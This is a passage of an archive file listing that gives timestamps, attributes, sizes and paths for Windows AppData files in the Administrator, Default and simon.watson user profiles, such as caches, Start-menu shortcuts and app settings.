Administrator/AppData/Local/Microsoft/Windows/Explorer/thumbcache_wide_alternate.db 2025-02-16 10:48:50 ....A 24 24 Administrator/AppData/Local/Microsoft/Windows/Explorer/thumbcache_256.db 2025-02-16 10:48:50 ....A 1048576 9228 Administrator/AppData/Local/Microsoft/Windows/Explorer/thumbcache_16.db 2025-02-16 10:48:50 ....A 24 24 Administrator/AppData/Local/Microsoft/Windows/Explorer/thumbcache_48.db 2025-02-16 10:48:50 ....A 7416 326 Administrator/AppData/Local/Microsoft/Windows/Explorer/thumbcache_idx.db 2025-02-16 10:48:50 ....A 1048576 10728 Administrator/AppData/Local/Microsoft/Windows/Explorer/thumbcache_32.db 2025-02-16 11:18:05 ....A 130 130 Administrator/AppData/Local/Microsoft/Windows/History/desktop.ini 2025-02-16 11:17:04 ....A 32768 511 Administrator/AppData/Local/Microsoft/Windows/Notifications/wpndatabase.db-shm 2025-02-16 11:22:14 ....A 189552 48718 Administrator/AppData/Local/Microsoft/Windows/Notifications/wpndatabase.db-wal 2025-02-16 11:16:07 ....A 1048576 60267 Administrator/AppData/Local/Microsoft/Windows/Notifications/wpndatabase.db 2025-02-16 10:48:50 ....A 52 52 Administrator/AppData/Local/Microsoft/Windows/Safety/shell/remote/script 2025-02-16 10:48:50 ....A 31162 6959 Administrator/AppData/Local/Microsoft/Windows/Safety/shell/remote/script_96032244749497702726114603847611723578.rel.v2 2021-05-08 08:18:31 ....A 63955 20467 Administrator/AppData/Local/Microsoft/Windows/Shell/DefaultLayouts.xml 2025-02-16 11:16:07 ....A 8192 357 Administrator/AppData/Local/Microsoft/Windows/WebCache/V01.chk 2025-02-16 11:16:07 ....A 524288 108416 Administrator/AppData/Local/Microsoft/Windows/WebCache/V01.log 2025-02-16 11:16:07 ....A 16384 360 Administrator/AppData/Local/Microsoft/Windows/WebCache/WebCacheV01.jfm 2021-05-08 08:14:58 ....A 1109 450 Administrator/AppData/Local/Microsoft/Windows/WinX/Group1/1 - Desktop.lnk 2021-05-08 08:14:58 ....A 1109 450 Default/AppData/Local/Microsoft/Windows/WinX/Group1/1 - Desktop.lnk 2021-05-08 08:14:58 ....A 1109 450 simon.watson/AppData/Local/Microsoft/Windows/WinX/Group1/1 - Desktop.lnk 2021-05-08 08:18:35 ..HSA 75 75 Administrator/AppData/Local/Microsoft/Windows/WinX/Group1/desktop.ini 2021-05-08 08:18:35 ..HSA 75 75 Default/AppData/Local/Microsoft/Windows/WinX/Group1/desktop.ini 2021-05-08 08:18:35 ..HSA 75 75 simon.watson/AppData/Local/Microsoft/Windows/WinX/Group1/desktop.ini 2021-05-08 08:14:58 ....A 1109 454 Administrator/AppData/Local/Microsoft/Windows/WinX/Group2/1 - Run.lnk 2021-05-08 08:14:58 ....A 1109 454 Default/AppData/Local/Microsoft/Windows/WinX/Group2/1 - Run.lnk 2021-05-08 08:14:58 ....A 1109 454 simon.watson/AppData/Local/Microsoft/Windows/WinX/Group2/1 - Run.lnk 2021-05-08 08:14:58 ....A 1109 454 Administrator/AppData/Local/Microsoft/Windows/WinX/Group2/2 - Search.lnk 2021-05-08 08:14:58 ....A 1109 454 Default/AppData/Local/Microsoft/Windows/WinX/Group2/2 - Search.lnk 2021-05-08 08:14:58 ....A 1109 454 simon.watson/AppData/Local/Microsoft/Windows/WinX/Group2/2 - Search.lnk 2021-05-08 08:14:58 ....A 1109 452 Administrator/AppData/Local/Microsoft/Windows/WinX/Group2/3 - Windows Explorer.lnk 2021-05-08 08:14:58 ....A 1109 452 Default/AppData/Local/Microsoft/Windows/WinX/Group2/3 - Windows Explorer.lnk 2021-05-08 08:14:58 ....A 1109 452 simon.watson/AppData/Local/Microsoft/Windows/WinX/Group2/3 - Windows Explorer.lnk 2021-05-08 08:14:58 ....A 1492 806 Administrator/AppData/Local/Microsoft/Windows/WinX/Group2/4 - Control Panel.lnk 2021-05-08 08:14:58 ....A 1492 806 Default/AppData/Local/Microsoft/Windows/WinX/Group2/4 - Control Panel.lnk 2021-05-08 08:14:58 ....A 1492 806 simon.watson/AppData/Local/Microsoft/Windows/WinX/Group2/4 - Control Panel.lnk 2021-05-08 08:14:58 ....A 1021 421 Administrator/AppData/Local/Microsoft/Windows/WinX/Group2/5 - Task Manager.lnk 2021-05-08 08:14:58 ....A 1021 421 Default/AppData/Local/Microsoft/Windows/WinX/Group2/5 - Task Manager.lnk 2021-05-08 08:14:58 ....A 1021 421 simon.watson/AppData/Local/Microsoft/Windows/WinX/Group2/5 - Task Manager.lnk 2021-05-08 08:18:35 ..HSA 325 325 Administrator/AppData/Local/Microsoft/Windows/WinX/Group2/desktop.ini 2021-05-08 08:18:35 ..HSA 325 325 Default/AppData/Local/Microsoft/Windows/WinX/Group2/desktop.ini 2021-05-08 08:18:35 ..HSA 325 325 simon.watson/AppData/Local/Microsoft/Windows/WinX/Group2/desktop.ini 2021-05-08 08:14:58 ....A 1015 409 Administrator/AppData/Local/Microsoft/Windows/WinX/Group3/01 - Command Prompt.lnk 2021-05-08 08:14:58 ....A 1015 409 Default/AppData/Local/Microsoft/Windows/WinX/Group3/01 - Command Prompt.lnk 2021-05-08 08:14:58 ....A 1015 409 simon.watson/AppData/Local/Microsoft/Windows/WinX/Group3/01 - Command Prompt.lnk 2021-05-08 08:14:58 ....A 1127 458 Administrator/AppData/Local/Microsoft/Windows/WinX/Group3/01a - Windows PowerShell.lnk 2021-05-08 08:14:58 ....A 1127 458 Default/AppData/Local/Microsoft/Windows/WinX/Group3/01a - Windows PowerShell.lnk 2021-05-08 08:14:58 ....A 1127 458 simon.watson/AppData/Local/Microsoft/Windows/WinX/Group3/01a - Windows PowerShell.lnk 2021-05-08 08:14:58 ....A 1059 431 Administrator/AppData/Local/Microsoft/Windows/WinX/Group3/02 - Command Prompt.lnk 2021-05-08 08:14:58 ....A 1059 431 Default/AppData/Local/Microsoft/Windows/WinX/Group3/02 - Command Prompt.lnk 2021-05-08 08:14:58 ....A 1059 431 simon.watson/AppData/Local/Microsoft/Windows/WinX/Group3/02 - Command Prompt.lnk 2021-05-08 08:14:58 ....A 1171 482 Administrator/AppData/Local/Microsoft/Windows/WinX/Group3/02a - Windows PowerShell.lnk 2021-05-08 08:14:58 ....A 1171 482 Default/AppData/Local/Microsoft/Windows/WinX/Group3/02a - Windows PowerShell.lnk 2021-05-08 08:14:58 ....A 1171 482 simon.watson/AppData/Local/Microsoft/Windows/WinX/Group3/02a - Windows PowerShell.lnk 2021-05-08 08:14:58 ....A 1015 417 Administrator/AppData/Local/Microsoft/Windows/WinX/Group3/03 - Computer Management.lnk 2021-05-08 08:14:58 ....A 1015 417 Default/AppData/Local/Microsoft/Windows/WinX/Group3/03 - Computer Management.lnk 2021-05-08 08:14:58 ....A 1015 417 simon.watson/AppData/Local/Microsoft/Windows/WinX/Group3/03 - Computer Management.lnk 2021-05-08 08:14:58 ....A 1015 416 Administrator/AppData/Local/Microsoft/Windows/WinX/Group3/04 - Disk Management.lnk 2021-05-08 08:14:58 ....A 1015 416 Default/AppData/Local/Microsoft/Windows/WinX/Group3/04 - Disk Management.lnk 2021-05-08 08:14:58 ....A 1015 416 simon.watson/AppData/Local/Microsoft/Windows/WinX/Group3/04 - Disk Management.lnk 2021-05-08 08:14:58 ....A 1582 834 Administrator/AppData/Local/Microsoft/Windows/WinX/Group3/04-1 - NetworkStatus.lnk 2021-05-08 08:14:58 ....A 1582 834 Default/AppData/Local/Microsoft/Windows/WinX/Group3/04-1 - NetworkStatus.lnk 2021-05-08 08:14:58 ....A 1582 834 simon.watson/AppData/Local/Microsoft/Windows/WinX/Group3/04-1 - NetworkStatus.lnk 2021-05-08 08:14:58 ....A 1075 453 Administrator/AppData/Local/Microsoft/Windows/WinX/Group3/05 - Device Manager.lnk 2021-05-08 08:14:58 ....A 1075 453 Default/AppData/Local/Microsoft/Windows/WinX/Group3/05 - Device Manager.lnk 2021-05-08 08:14:58 ....A 1075 453 simon.watson/AppData/Local/Microsoft/Windows/WinX/Group3/05 - Device Manager.lnk 2021-05-08 08:14:58 ....A 1576 837 Administrator/AppData/Local/Microsoft/Windows/WinX/Group3/06 - SystemAbout.lnk 2021-05-08 08:14:58 ....A 1576 837 Default/AppData/Local/Microsoft/Windows/WinX/Group3/06 - SystemAbout.lnk 2021-05-08 08:14:58 ....A 1576 837 simon.watson/AppData/Local/Microsoft/Windows/WinX/Group3/06 - SystemAbout.lnk 2021-05-08 08:14:58 ....A 1015 417 Administrator/AppData/Local/Microsoft/Windows/WinX/Group3/07 - Event Viewer.lnk 2021-05-08 08:14:58 ....A 1015 417 Default/AppData/Local/Microsoft/Windows/WinX/Group3/07 - Event Viewer.lnk 2021-05-08 08:14:58 ....A 1015 417 simon.watson/AppData/Local/Microsoft/Windows/WinX/Group3/07 - Event Viewer.lnk 2021-05-08 08:14:58 ....A 1578 839 Administrator/AppData/Local/Microsoft/Windows/WinX/Group3/08 - PowerAndSleep.lnk 2021-05-08 08:14:58 ....A 1578 839 Default/AppData/Local/Microsoft/Windows/WinX/Group3/08 - PowerAndSleep.lnk 2021-05-08 08:14:58 ....A 1578 839 simon.watson/AppData/Local/Microsoft/Windows/WinX/Group3/08 - PowerAndSleep.lnk 2021-05-08 08:14:58 ....A 1015 415 Administrator/AppData/Local/Microsoft/Windows/WinX/Group3/09 - Mobility Center.lnk 2021-05-08 08:14:58 ....A 1015 415 Default/AppData/Local/Microsoft/Windows/WinX/Group3/09 - Mobility Center.lnk 2021-05-08 08:14:58 ....A 1015 415 simon.watson/AppData/Local/Microsoft/Windows/WinX/Group3/09 - Mobility Center.lnk 2021-05-08 08:14:58 ....A 1578 839 Administrator/AppData/Local/Microsoft/Windows/WinX/Group3/10 - AppsAndFeatures.lnk 2021-05-08 08:14:58 ....A 1578 839 Default/AppData/Local/Microsoft/Windows/WinX/Group3/10 - AppsAndFeatures.lnk 2021-05-08 08:14:58 ....A 1578 839 simon.watson/AppData/Local/Microsoft/Windows/WinX/Group3/10 - AppsAndFeatures.lnk 2021-05-08 08:18:35 ..HSA 941 529 Administrator/AppData/Local/Microsoft/Windows/WinX/Group3/desktop.ini 2021-05-08 08:18:35 ..HSA 941 529 Default/AppData/Local/Microsoft/Windows/WinX/Group3/desktop.ini 2021-05-08 08:18:35 ..HSA 941 529 simon.watson/AppData/Local/Microsoft/Windows/WinX/Group3/desktop.ini 2021-05-08 08:18:31 ....A 80 80 Administrator/AppData/Local/Microsoft/Windows Sidebar/settings.ini 2021-05-08 08:18:31 ....A 80 80 Default/AppData/Local/Microsoft/Windows Sidebar/settings.ini 2021-05-08 08:18:31 ....A 80 80 simon.watson/AppData/Local/Microsoft/Windows Sidebar/settings.ini 2025-02-16 11:18:27 ....A 6041 1751 Administrator/AppData/Local/Microsoft_Corporation/ServerManager.exe_StrongName_m3xk0k0ucj0oj3ai2hibnhnv4xobnimj/10.0.0.0/user.config 2021-05-08 08:14:16 ....A 8192 617 Administrator/AppData/Local/Packages/1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy/Settings/settings.dat 2021-05-08 08:14:16 ....A 8192 617 Administrator/AppData/Local/Packages/c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy/Settings/settings.dat 2021-05-08 08:14:16 ....A 8192 617 Administrator/AppData/Local/Packages/E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy/Settings/settings.dat 2021-05-08 08:14:16 ....A 8192 617 Administrator/AppData/Local/Packages/F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy/Settings/settings.dat 2021-05-08 08:14:16 ....A 8192 617 Administrator/AppData/Local/Packages/Microsoft.AccountsControl_cw5n1h2txyewy/Settings/settings.dat 2021-05-08 08:14:16 ....A 8192 617 Administrator/AppData/Local/Packages/Microsoft.AsyncTextService_8wekyb3d8bbwe/Settings/settings.dat 2021-05-08 08:14:16 ....A 8192 617 Administrator/AppData/Local/Packages/Microsoft.BioEnrollment_cw5n1h2txyewy/Settings/settings.dat 2021-05-08 08:14:16 ....A 8192 617 Administrator/AppData/Local/Packages/Microsoft.CredDialogHost_cw5n1h2txyewy/Settings/settings.dat 2021-05-08 08:14:16 ....A 8192 617 Administrator/AppData/Local/Packages/Microsoft.ECApp_8wekyb3d8bbwe/Settings/settings.dat 2021-05-08 08:14:16 ....A 8192 617 Administrator/AppData/Local/Packages/Microsoft.LockApp_cw5n1h2txyewy/Settings/settings.dat 2021-05-08 08:14:16 ....A 8192 617 Administrator/AppData/Local/Packages/Microsoft.Win32WebViewHost_cw5n1h2txyewy/Settings/settings.dat 2021-05-08 08:14:16 ....A 8192 617 Administrator/AppData/Local/Packages/Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy/Settings/settings.dat 2021-05-08 08:14:16 ....A 8192 617 Administrator/AppData/Local/Packages/Microsoft.Windows.CapturePicker_cw5n1h2txyewy/Settings/settings.dat 2021-05-08 08:14:16 ....A 8192 617 Administrator/AppData/Local/Packages/Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy/Settings/settings.dat 2021-05-08 08:14:16 ....A 8192 617 Administrator/AppData/Local/Packages/Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe/Settings/settings.dat 2021-05-08 08:14:16 ....A 8192 617 Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy/Settings/settings.dat 2021-05-08 08:14:16 ....A 8192 617 Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy/Settings/settings.dat 2021-05-08 08:14:16 ....A 8192 617 Administrator/AppData/Local/Packages/Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy/Settings/settings.dat 2021-05-08 08:14:16 ....A 8192 617 Administrator/AppData/Local/Packages/Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy/Settings/settings.dat 2021-05-08 08:14:16 ....A 8192 617 Administrator/AppData/Local/Packages/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/Settings/settings.dat 2021-05-08 08:14:16 ....A 8192 617 Administrator/AppData/Local/Packages/Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy/Settings/settings.dat 2021-05-08 08:14:16 ....A 8192 617 Administrator/AppData/Local/Packages/Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy/Settings/settings.dat 2021-05-08 08:14:16 ....A 8192 617 Administrator/AppData/Local/Packages/MicrosoftWindows.Client.CBS_cw5n1h2txyewy/Settings/settings.dat 2021-05-08 08:14:16 ....A 8192 617 Administrator/AppData/Local/Packages/MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy/Settings/settings.dat 2021-05-08 08:14:16 ....A 8192 617 Administrator/AppData/Local/Packages/Windows.CBSPreview_cw5n1h2txyewy/Settings/settings.dat 2021-05-08 08:14:16 ....A 8192 617 Administrator/AppData/Local/Packages/windows.immersivecontrolpanel_cw5n1h2txyewy/Settings/settings.dat 2021-05-08 08:14:16 ....A 8192 617 Administrator/AppData/Local/Packages/Windows.PrintDialog_cw5n1h2txyewy/Settings/settings.dat 2025-02-16 10:48:53 ....A 8192 934 Administrator/AppData/Local/Packages/Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy/Settings/settings.dat 2025-02-16 10:48:53 ..HSA 8192 957 Administrator/AppData/Local/Packages/Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy/Settings/settings.dat.LOG1 2025-02-16 10:59:22 ....A 49120 750 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/INetCache/MSIMGSIZ.DAT 2025-02-16 11:17:31 ....A 97 97 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/Microsoft/Internet Explorer/DOMStore/M9FQX7WM/microsoft.windows[1].xml 2025-02-16 10:52:22 ....A 1960 880 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/Temp/StructuredQuery.log 2025-02-16 10:48:53 ...SA 2684 1327 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/TokenBroker/Cache/95d9a2a97a42f02325559b453ba7f8fe839baa18.tbres 2025-02-16 10:48:53 ...SA 2278 1115 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/TokenBroker/Cache/fbaf94e759052658216786bfbabcdced1b67a5c2.tbres 2025-02-16 11:17:31 ....A 1572864 19150 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AppData/CacheStorage/CacheStorage.edb 2025-02-16 11:17:31 ....A 16384 328 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AppData/CacheStorage/CacheStorage.jfm 2025-02-16 11:17:31 ....A 8192 385 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AppData/Indexed DB/edb.chk 2025-02-16 11:17:31 ....A 524288 21405 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AppData/Indexed DB/edb.log 2025-02-16 11:17:31 ....A 2097152 27326 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AppData/Indexed DB/IndexedDB.edb 2025-02-16 11:17:31 ....A 16384 331 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AppData/Indexed DB/IndexedDB.jfm 2025-02-16 10:59:28 ....A 25750 2224 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/Microsoft_AutoGenerated_{18C6F720-ABAE-A6EF-86EC-0E72549F6916} 2025-02-16 10:59:28 ....A 25750 13920 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/Microsoft_AutoGenerated_{8AA47365-B2B3-1961-69EB-F866E376B12F} 2025-02-16 10:59:28 ....A 25750 13920 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/Microsoft_AutoGenerated_{C804BBA7-FA5F-CBF7-8B55-2096E5F972CB} 2025-02-16 10:59:28 ....A 25750 12899 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/Microsoft_AutoGenerated_{8ABD94FB-E7D6-84A6-A997-C918EDDE0AE5} 2025-02-16 10:59:28 ....A 25750 8098 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/Microsoft_AutoGenerated_{923DD477-5846-686B-A659-0FCCD73851A8} 2025-02-16 10:59:28 ....A 25750 7936 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/Microsoft_AutoGenerated_{BB044BFD-25B7-2FAA-22A8-6371A93E0456} 2025-02-16 10:59:28 ....A 25750 10956 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/Microsoft_AutoGenerated_{BD3F924E-55FB-A1BA-9DE6-B50F9F2460AC} 2025-02-16 10:59:28 ....A 25750 10466 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/Microsoft_AutoGenerated_{C1C6F8AC-40A3-0F5C-146F-65A9DC70BBB4} 2025-02-16 10:59:28 ....A 25750 7903 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/Microsoft_AutoGenerated_{DAA168DE-4306-C8BC-8C11-B596240BDDED} 2025-02-16 10:59:28 ....A 25750 10560 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/Microsoft_InternetExplorer_Default 2025-02-16 10:59:28 ....A 25750 3833 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/Microsoft_Windows_AdministrativeTools 2025-02-16 10:59:28 ....A 25750 4919 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/Microsoft_Windows_Computer 2025-02-16 10:59:28 ....A 25750 4282 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/Microsoft_Windows_ControlPanel 2025-02-16 10:59:28 ....A 25750 3343 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/Microsoft_Windows_Explorer 2025-02-16 10:59:28 ....A 25750 8062 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/Microsoft_Windows_MediaPlayer32 2025-02-16 10:59:28 ....A 25750 9732 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/Microsoft_Windows_RemoteDesktop 2025-02-16 10:59:28 ....A 25750 2458 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/Microsoft_Windows_SecHealthUI_cw5n1h2txyewy!SecHealthUI 2025-02-16 10:59:28 ....A 25750 2458 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/windows_immersivecontrolpanel_cw5n1h2txyewy!microsoft_windows_immersivecontrolpanel 2025-02-16 10:59:28 ....A 25750 3900 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/Microsoft_Windows_Shell_RunDialog 2025-02-16 10:59:28 ....A 25750 9334 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/MSEdge 2025-02-16 10:59:28 ....A 25750 7526 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_charmap_exe 2025-02-16 10:59:28 ....A 25750 4045 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_cleanmgr_exe 2025-02-16 10:59:28 ....A 25750 2040 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_cmd_exe 2025-02-16 10:59:28 ....A 25750 9613 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_comexp_msc 2025-02-16 10:59:28 ....A 25750 11603 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_dfrgui_exe 2025-02-16 10:59:28 ....A 25750 13958 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_iscsicpl_exe 2025-02-16 10:59:28 ....A 25750 6144 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_magnify_exe 2025-02-16 10:59:28 ....A 25750 7630 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_MdSched_exe 2025-02-16 10:59:28 ....A 25750 7780 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_msconfig_exe 2025-02-16 10:59:28 ....A 25750 8361 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_msinfo32_exe 2025-02-16 10:59:28 ....A 25750 9336 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_mspaint_exe 2025-02-16 10:59:28 ....A 25750 1469 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_narrator_exe 2025-02-16 10:59:28 ....A 25750 11033 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_notepad_exe 2025-02-16 10:59:28 ....A 25750 8735 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_odbcad32_exe 2025-02-16 10:59:28 ....A 25750 8735 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{D65231B0-B2F1-4857-A4CE-A8E7C6EA7D27}_odbcad32_exe 2025-02-16 10:59:28 ....A 25750 8359 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_osk_exe 2025-02-16 10:59:28 ....A 25750 8138 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_psr_exe 2025-02-16 10:59:28 ....A 25750 5192 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_RecoveryDrive_exe 2025-02-16 10:59:28 ....A 25750 1015 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_ServerManager_exe 2025-02-16 10:59:28 ....A 25750 4942 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_services_msc 2025-02-16 10:59:28 ....A 25750 6312 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_SnippingTool_exe 2025-02-16 10:59:28 ....A 25750 10947 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_wbadmin_msc 2025-02-16 10:59:28 ....A 25750 14686 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_WF_msc 2025-02-16 10:59:28 ....A 25750 8470 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_win32calc_exe 2025-02-16 10:59:28 ....A 25750 3570 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_WindowsPowerShell_v1_0_powershell_exe 2025-02-16 10:59:28 ....A 25750 3570 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{D65231B0-B2F1-4857-A4CE-A8E7C6EA7D27}_WindowsPowerShell_v1_0_powershell_exe 2025-02-16 10:59:28 ....A 25750 3543 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_WindowsPowerShell_v1_0_PowerShell_ISE_exe 2025-02-16 10:59:28 ....A 25750 3543 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{D65231B0-B2F1-4857-A4CE-A8E7C6EA7D27}_WindowsPowerShell_v1_0_PowerShell_ISE_exe 2025-02-16 10:59:28 ....A 25750 7222 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_xpsrchvw_exe 2025-02-16 10:59:28 ....A 25750 7311 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{6D809377-6AF0-444B-8957-A3773F02200E}_Common Files_Microsoft Shared_Ink_mip_exe 2025-02-16 10:59:28 ....A 25750 7668 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{6D809377-6AF0-444B-8957-A3773F02200E}_Windows NT_Accessories_wordpad_exe 2025-02-16 11:10:47 ....A 25750 3824 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{F38BF404-1D43-42F2-9305-67DE0B28FC23}_AzureArcSetup_ArcSetup_AzureArcSetup_exe 2025-02-16 10:59:28 ....A 25750 3662 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{F38BF404-1D43-42F2-9305-67DE0B28FC23}_regedit_exe 2025-02-16 11:11:01 ....A 25902 7874 